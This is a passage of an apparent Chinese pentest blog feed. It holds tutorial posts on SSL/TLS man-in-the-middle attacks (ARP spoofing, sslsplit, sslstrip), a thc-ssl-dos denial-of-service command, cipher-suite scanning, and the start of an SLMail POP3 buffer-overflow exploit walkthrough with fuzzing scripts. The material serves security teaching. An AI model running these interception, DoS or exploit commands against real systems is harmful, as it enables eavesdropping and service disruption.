      <category term="ZAP" scheme="http://c.cat.plus/tags/ZAP/"/>
    
      <category term="DOM" scheme="http://c.cat.plus/tags/DOM/"/>
    
  </entry>
  
  <entry>
    <title>SSL_TSL中间人攻击</title>
    <link href="http://c.cat.plus/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>http://c.cat.plus/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
    <published>2014-05-19T10:02:37.000Z</published>
    <updated>2020-05-21T08:24:02.602Z</updated>
    
    <content type="html"><![CDATA[<p>攻击者位于客户端和服务器通信链路中<br>    ARP        // Data link层,修改MAC地址,ARP Spoof让流量流经中间人<br>    DHCP    // 动态主机配置协议,用来自动获取IP<br>    修改网关<br>    修改DNS<br>    修改HOSTS<br>    ICMP,STP,OSPF<br>加密流量        // 伪造证书解密</p><p><strong>攻击的前提</strong></p><ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了核发证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端,并强制其信任伪造证书</li></ul><h4 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a><strong>SSLsplit</strong></h4><p>透明SSL/TLS中间人攻击工具<br>对客户端伪造成服务器,对服务器伪装成普通客户端<br>伪装服务器需要伪造证书<br>支持SSL/TLS加密的SMTP,POP3,FTP等通信中间人攻击<br><strong>利用openssl生成证书私钥</strong><br>    <code>openssl genrsa -out ca.key 2048</code><br><strong>利用私钥签名生成证书</strong><br>    <code>openssl reg -new -x509 -days 1096 -key ca.key -out ca.crt</code></p><h4 id="启动路由"><a href="#启动路由" class="headerlink" title="启动路由"></a><strong>启动路由</strong></h4><pre><code>sysctl -w net.ipv4.ip_forward=1cat /proc/sys/net/ipv4/ip_forwardecho 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h4 id="Iptables端口转发规则"><a href="#Iptables端口转发规则" class="headerlink" title="Iptables端口转发规则"></a><strong>Iptables端口转发规则</strong></h4><pre><code>iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSAiptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPSiptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPSiptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3Siptables -t nat -L        //查看nat规则netstat -pantu | grep :80        //查看80端口是否被占用</code></pre><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a><strong>ARP欺骗</strong></h4><pre><code>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</code></pre><h4 id="启动SSLsplit"><a href="#启动SSLsplit" class="headerlink" title="启动SSLsplit"></a><strong>启动SSLsplit</strong></h4><pre><code>mkdir -p test/logdirsslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></pre><p>被害者访问taobao,baidu,mail.163.com<br>查看日志和浏览器证书及证书报错信息<br>安装服务器根证书之后再次访问</p><h4 id="Mitmproxy"><a href="#Mitmproxy" class="headerlink" title="Mitmproxy"></a><strong>Mitmproxy</strong></h4><pre><code>iptables端口转发规则iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --toport 8080</code></pre><p>Mitmproxy和sslsplit类似,也需要先执行ARP欺骗,且有个BUG,iptables端口只能转发8080有效<br>     mitmproxy -T –host -w mitmproxy.log</p><h4 id="SSLstrip"><a href="#SSLstrip" class="headerlink" title="SSLstrip"></a><strong>SSLstrip</strong></h4><p>与前两种工具不同,将客户端到中间人之间的流量变为明文<br>一样也需要结合ARP欺骗<br>    <code>sslstrip -l 8080</code></p><blockquote><h3 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a><strong>SSL/TLS拒绝服务攻击</strong></h3></blockquote><ul><li>thc-ssl-dos<br>SSL协商加密对性能开销增加,大量握手请求会导致拒绝服务<br>利用SSL secure Renegotiation特性,在单一TCP连接中生成数千个SSL重连接请求,造成服务器资源过载<br>与流量式拒绝服务攻击不同,thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器<br>服务器平均可以处理300次/秒SSL握手请求<br>对SMTPS,POP3S等服务同样有效<br><code>thc-ssl-dos 1.1.1.1 443 -accept</code></li></ul><p>对策<br>禁用SSL-Renegotiation,使用SSL Accelerator<br>通过修改thc-ssl-dos代码,可以绕过以上对策    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;攻击者位于客户端和服务器通信链路中&lt;br&gt;    ARP        // Data link层,修改MAC地址,ARP Spoof让流量流经中间人&lt;br&gt;    DHCP    // 动态主机配置协议,用来自动获取IP&lt;br&gt;    修改网关&lt;br&gt;    修改DNS&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Web渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="ARP欺骗" scheme="http://c.cat.plus/tags/ARP%E6%AC%BA%E9%AA%97/"/>
    
      <category term="SSLsplit" scheme="http://c.cat.plus/tags/SSLsplit/"/>
    
      <category term="DOS攻击" scheme="http://c.cat.plus/tags/DOS%E6%94%BB%E5%87%BB/"/>
    
      <category term="拒绝服务攻击" scheme="http://c.cat.plus/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>HTTPS漏洞及攻击方法</title>
    <link href="http://c.cat.plus/2014/05/18/Web_Attacks/HTTPS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2014/05/18/Web_Attacks/HTTPS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</id>
    <published>2014-05-18T14:22:32.000Z</published>
    <updated>2020-05-19T06:24:18.883Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a><strong>HTTPS攻击</strong></h3></blockquote><p>全站HTTPS正成为潮流趋势<br>    淘宝,百度<br>HTTPS的作用<br>    信息安全3要素: <strong><code>CIA</code></strong> (安全性,完整性,可用性)<br>    解决的是信息传输过程中数据被篡改,窃取<br>    加密:对称,非对称,单向<br>HTTPS攻击方法<br>    降级攻击<br>    解密攻击(明文,证书伪造)<br>    协议漏洞,实现方法的漏洞,配置不严格</p><p><strong>SSL</strong>(Secure Socket Layer)    // <em>1安全套接层</em><br>保证网络通信安全的加密协议<br>1994年由Netscape开发成为统一标准<br>1999年 <strong>TLS</strong>(Transport Layer Security)取代SSL v3<br>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<br>    Heartbleed<br>    POODIE<br>    BEAST<br>TLS 当前最新版本 1.2<br>TLS/SSL,HTTPS,HTTP over SSL 通俗上表示同一含义</p><p>SSL/TLS也被用于其它场景的传输通道加密<br>邮件传输(服务器间,客户端与服务器间)<br>数据库服务器间<br>LDAP身份认证服务器间<br>SSL VPN<br>远程桌面RDP通信过程中的加密和身份认证</p><h4 id="Web通信中的SSL加密"><a href="#Web通信中的SSL加密" class="headerlink" title="Web通信中的SSL加密"></a><strong>Web通信中的SSL加密</strong></h4><p>公钥证书(受信任的第三方证书颁发机构签名颁发)<br>    VeriSign<br>    Thawte<br>    GlobalSign<br>    Symantec</p><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a><strong>加密过程</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A(握手) --&gt;B(协商加密算法) </span><br><span class="line">B --&gt; C(获取公钥证书)</span><br><span class="line">C --&gt; D(验证公钥证书)</span><br><span class="line">D --&gt; E(交换会话密钥)</span><br><span class="line">E --&gt; F(加密信息传输)</span><br></pre></td></tr></table></figure><h4 id="常见加密算法"><a href="#常见加密算法" class="headerlink" title="常见加密算法"></a><strong>常见加密算法</strong></h4><p><strong>非对称加密算法</strong><br>    Diffie-Hellman key exchange<br>    Rivest Shamir Adleman (RSA)<br>    Elliptic Curve Cryptography (ECC)<br><strong>对称加密算法</strong><br>    Data Encryption Standard (DES) / 3DES<br>    Advance Encryption Standard (AES)<br>    International Data Encryption Algorithm (IDEA)<br>    Rivest Cipher 4 (RC4)<br>        WEP̵TLS/SSL̵RDP̵Secure shell<br><strong>单向加密算法</strong></p><table><thead><tr><th>HASH算法</th><th>HASH值长度(bit)</th></tr></thead><tbody><tr><td>MD5</td><td>128</td></tr><tr><td>SHA-1</td><td>160</td></tr><tr><td>SHA-2</td><td>224, 256, 384, 512</td></tr></tbody></table><p>SHA-3已经设计完成,但尚未广泛使用<br>SHA-2是TLS 1.2唯一支持的单向加密算法<br>碰撞攻击针对单向加密算法<br>    两个不同的文件生成相同的HASH值</p><h4 id="SSL的弱点"><a href="#SSL的弱点" class="headerlink" title="SSL的弱点"></a><strong>SSL的弱点</strong></h4><p>SSL是不同的对称,非对称,单向加密算法的组合加密实现(cipher suite)</p><table><thead><tr><th>加密算法</th><th>SSL实现中的用途</th></tr></thead><tbody><tr><td>RAS / Diffle-Hellman</td><td>密钥交换,身份认证</td></tr><tr><td>AES</td><td>加密数据,由RAS/DH完成密钥交换</td></tr><tr><td>HMAC-SHA2</td><td>摘要信息</td></tr></tbody></table><p>服务器端为提供更好的兼容性,选择支持大量过时cipher suite<br>协商过程中强迫降级加密强度<br>现代处理器计算能力可以在可接受的时间内破解过时加密算法<br>购买云计算资源破解</p><h4 id="Openssl"><a href="#Openssl" class="headerlink" title="Openssl"></a><strong>Openssl</strong></h4><p>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</p><pre><code>openssl s_client -connect www.baidu.com:443openssl s_client -tls1_2 -cipher &apos;ECDH-RSA-RC4-SHA&apos; -connect www.taobao.com:443    密钥交换-身份认证-数据加密-HASH算法openssl s_client -tls1_2 -cipher “NULL,EXPORT,LOW,DES” -connect  www.taobao.com:443    (协商低安全级别cipher suite)可被破解的cipher suite    openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;https://www.openssl.org/docs/apps/ciphers.html</code></pre><p>Openssl需要大量密码学相关知识,命令复杂,结果可读性差</p><h4 id="SSLScan"><a href="#SSLScan" class="headerlink" title="SSLScan"></a><strong>SSLScan</strong></h4><p>自动识别SSAL配置错误,过期协议,过时cipher suite和hash算法<br>    默认会检查CRIME,heartbleed漏洞<br>    绿色表示安全,红色黄色需要引起注意<br>    TLS支持的cipher suite<br>        <code>sslscan --tlsall www.taobao.com:443</code><br>    分析证书详细数据<br>        <code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></p><h4 id="SSLyze"><a href="#SSLyze" class="headerlink" title="SSLyze"></a><strong>SSLyze</strong></h4><p>Python语言编写<br>    检查SSL过时版本<br>    检查存在弱点的cipther suite<br>    扫描多站点时,支持来源文件<br>    检查是否支持会话恢复<br><code>sslyze --regular  www.taobao.com:443</code></p><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h4><pre><code>nmap --script=ssl-enum-ciphers.nse www.taobao.comdpkg -L nmap | grep script | grep ssl    #查看nmap扫描ssl相关脚本</code></pre><p><a href="https://www.ssllabs.com/ssltest" target="_blank" rel="noopener">https://www.ssllabs.com/ssltest</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;HTTPS攻击&quot;&gt;&lt;a href=&quot;#HTTPS攻击&quot; class=&quot;headerlink&quot; title=&quot;HTTPS攻击&quot;&gt;&lt;/a&gt;&lt;strong&gt;HTTPS攻击&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;全站HTTP
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Web渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="sslscan" scheme="http://c.cat.plus/tags/sslscan/"/>
    
      <category term="Heartbleed" scheme="http://c.cat.plus/tags/Heartbleed/"/>
    
      <category term="加密算法" scheme="http://c.cat.plus/tags/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Windows缓冲区溢出测试</title>
    <link href="http://c.cat.plus/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/"/>
    <id>http://c.cat.plus/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/</id>
    <published>2013-08-11T11:14:02.000Z</published>
    <updated>2020-05-16T06:48:52.817Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a><strong>缓冲区溢出</strong></h4></blockquote><p>程序漏洞从哪里来<br>    罪恶的根源:变量<br>    数据与代码边界不清<br>    最简漏洞原理—-shell脚本漏洞</p><p>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被”撑爆”,从而覆盖了相邻内存区域的数据；</p><p>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果.</p><p>如何发现漏洞<br>    源码审计<br>    逆向工程<br>    模糊测试<br>        向程序堆栈半随机的数据,根据内存变化判断溢出<br>        数据生成器:生成随机,半随机数据<br>        测试工具:识别溢出漏洞</p><blockquote><h4 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h4></blockquote><p>FUZZER<br>SLMail 5.5.0 Mail Server<br>    POP3 PASS 命令存在缓冲区溢出漏洞<br>    无需身份验证实现远程代码执行<br>    win7++ 已升级DEP ASLR<br>        DEP:阻止代码从数据页被执行<br>        ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化</p><p><code>ImmunityDebugger_1_85setup.exe</code><br><code>mana.py</code></p><p>FUZZING<br>    nc 110端口<br>    了解未知协议<br>        Wireshark<br>        RFC</p><blockquote><h4 id="python代码01-py"><a href="#python代码01-py" class="headerlink" title="python代码01.py"></a>python代码<code>01.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nSending evil buffer...."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'USER user'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>测试PASS命令接收到大量数据时是否会溢出<br>EIP寄存器存放下一条指令的地址</p><blockquote><h4 id="python代码02-py"><a href="#python代码02-py" class="headerlink" title="python代码02.py"></a>python代码<code>02.py</code></h4></blockquote><p>以每200递增循环发送A,测试溢出点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buffer=[<span class="string">"A"</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer)&lt;=<span class="number">30</span>:</span><br><span class="line">buffer.append(<span class="string">"A"</span>=*counter)</span><br><span class="line">counter=counter+<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes"</span> % len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+string+<span class="string">'\r\n'</span>)</span><br><span class="line">s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><blockquote><h4 id="2700个字符实现EIP寄存器溢出03-py"><a href="#2700个字符实现EIP寄存器溢出03-py" class="headerlink" title="2700个字符实现EIP寄存器溢出03.py"></a>2700个字符实现EIP寄存器溢出<code>03.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">'A'</span>*<span class="number">2700</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>找到精确溢出的4个字符<br>    二分法<br>    唯一字串法<br>        <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</code></p><blockquote><h4 id="python代码04-py"><a href="#python代码04-py" class="headerlink" title="python代码04.py"></a>python代码<code>04.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=</span><br><span class="line"><span class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 39694438</code>    #计算EIP寄存器内存地址ASCII码在2700唯一字符串中的偏移量</p><blockquote><h4 id="python代码05-py"><a href="#python代码05-py" class="headerlink" title="python代码05.py"></a>python代码<code>05.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td 